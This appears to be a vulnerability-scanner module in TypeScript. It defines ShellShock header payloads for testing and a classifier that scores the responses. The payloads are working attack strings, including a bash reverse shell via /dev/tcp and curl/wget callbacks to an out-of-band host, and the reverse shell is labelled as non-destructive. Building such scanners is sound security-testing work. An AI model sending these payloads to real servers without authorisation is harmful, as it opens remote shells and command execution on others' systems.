// Adapted from source-reference/vantix/secops/skills/ patterns.
// Rewritten in TypeScript. No runtime dependency on the vendored source.
import type { FamilyMetadata, OracleClassification, PayloadVariant, ProbeContext, ScannerResponseInput } from '../types';

export const META: FamilyMetadata = {
  id: 'shellshock',
  family: 'cve-named',
  title: 'ShellShock CVE-2014-6271 / CVE-2014-7169',
  severity: 'critical',
  destructiveRisk: 'none',
  requiresOast: true,
  requiresBrowser: false,
  insertionPointKinds: ['header'],
  expectedSignals: ['oast-callback-confirmed', 'command-output-reflected', 'status-delta'],
  cwe: [78],
};

export function variants(ctx: ProbeContext): PayloadVariant[] {
  const oastHost = ctx.oastBaseUrl ? new URL(ctx.oastBaseUrl).hostname : 'oast.pf.example';
  return [
    {
      id: 'sshock-user-agent-oast',
      family: 'cve-named',
      value: `() { :;}; /bin/bash -i >& /dev/tcp/${oastHost}/4444 0>&1`,
      encoding: 'header-safe',
      intent: 'ShellShock via User-Agent — reverse shell via /dev/tcp OAST',
      requiresOast: true,
      destructiveRisk: 'none',
      expectedSignals: ['oast-callback-confirmed'],
    },
    {
      id: 'sshock-referer-oast',
      family: 'cve-named',
      value: `() { :;}; curl http://${oastHost}/pf-sshock`,
      encoding: 'header-safe',
      intent: 'ShellShock via Referer header — curl OAST callback',
      requiresOast: true,
      destructiveRisk: 'none',
      expectedSignals: ['oast-callback-confirmed'],
    },
    {
      id: 'sshock-cookie-oast',
      family: 'cve-named',
      value: `() { :;}; wget -q http://${oastHost}/pf-sshock-cookie`,
      encoding: 'header-safe',
      intent: 'ShellShock via Cookie header — wget OAST callback',
      requiresOast: true,
      destructiveRisk: 'none',
      expectedSignals: ['oast-callback-confirmed'],
    },
    {
      id: 'sshock-echo-reflection',
      family: 'cve-named',
      value: '() { :;}; echo "PF-SHELLSHOCK-CVE-2014-6271"',
      encoding: 'header-safe',
      intent: 'ShellShock echo — check if command output reflected in response',
      requiresOast: false,
      destructiveRisk: 'none',
      expectedSignals: ['command-output-reflected'],
    },
    {
      id: 'sshock-original-cve',
      family: 'cve-named',
      value: '() { ignored; }; echo CVE-2014-6271',
      encoding: 'header-safe',
      intent: 'Original CVE-2014-6271 proof-of-concept payload',
      requiresOast: false,
      destructiveRisk: 'none',
      expectedSignals: ['command-output-reflected'],
    },
    {
      id: 'sshock-cve-7169',
      family: 'cve-named',
      value: '() { (a)=>\\ ' + '\\' + '; echo "PF-7169"',
      encoding: 'header-safe',
      intent: 'CVE-2014-7169 bash reset variant (parser edge case)',
      requiresOast: false,
      destructiveRisk: 'none',
      expectedSignals: ['command-output-reflected'],
    },
  ];
}

export function classify(
  resp: ScannerResponseInput,
  variant: PayloadVariant,
  baseline: ScannerResponseInput,
): OracleClassification {
  const evidence: string[] = [];
  let responseClass: OracleClassification['responseClass'] = 'neutral-or-not-parsed';
  let confidence = 0.1;
  let nextAction: OracleClassification['nextAction'] = 'continue';

  if (variant.requiresOast) {
    responseClass = 'neutral-or-not-parsed';
    confidence = 0.2;
    nextAction = 'continue';
    evidence.push('ShellShock OAST probe sent — awaiting callback');
  } else if (resp.bodyText.includes('PF-SHELLSHOCK') || resp.bodyText.includes('CVE-2014')) {
    responseClass = 'expected-proof';
    confidence = 0.97;
    nextAction = 'promote-finding';
    evidence.push('ShellShock command output reflected in response — confirmed RCE (CVE-2014-6271)');
  } else if (resp.statusCode !== baseline.statusCode) {
    responseClass = 'status-delta';
    confidence = 0.4;
    nextAction = 'continue';
    evidence.push(`Status delta ${baseline.statusCode}→${resp.statusCode}`);
  } else {
    nextAction = 'stop-negative';
    evidence.push('No ShellShock signal; server likely not Bash/CGI-based or patched');
  }

  return { payloadVariantId: variant.id, responseClass, confidence, evidence, nextAction };
}
